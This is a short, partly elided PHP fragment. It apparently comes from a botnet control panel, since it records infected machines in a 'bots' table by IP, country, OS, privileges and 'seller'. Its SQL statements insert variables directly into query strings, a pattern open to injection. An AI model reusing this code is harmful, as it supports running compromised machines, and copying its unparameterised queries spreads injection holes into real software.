			...
			switch (intval($bot["BOT_OPT"])){
				case 0:
					...
					if (mysqli_num_rows($req)){
						...
						$files = intval($row[0]);
						mysqli_query($dbcon,"UPDATE `bots` SET `ip`='{$ip}',`time`=".$time.",`seller`='{$sel}',`privs`={$privs} WHERE `cname`='{$login}'");
					} else {
						mysqli_query($dbcon,"INSERT INTO `bots` (`ip`,`os`,`country`,`time`,`cname`,`seller`,`bits`,`installed`,`privs`) VALUES ('{$ip}',{$os},'{$country}',{$time},'{$login}','{$sel}',{$bits},{$installed},{$privs}) ON DUPLICATE KEY UPDATE `time`={$time}");
